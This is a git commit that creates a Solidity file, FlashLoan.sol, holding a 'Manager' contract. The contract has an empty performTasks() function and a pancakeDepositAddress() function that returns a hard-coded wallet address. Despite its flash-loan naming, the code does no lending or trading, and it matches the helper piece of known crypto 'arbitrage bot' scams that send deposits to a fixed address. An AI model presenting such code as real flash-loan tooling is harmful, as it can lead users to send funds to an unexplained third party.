f9350c53c6854256f3d212b56a644c3053aad8f7
THEOFFICIALONE <107078847+THEOFFICIALONE@users.noreply.github.com>
2022-06-08 15:03:38 +0100

    Create FlashLoan.sol

---
+++ FlashLoan.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0x0806848a1a60D7b2e0407a299D734361277F4760;
+	}
+}
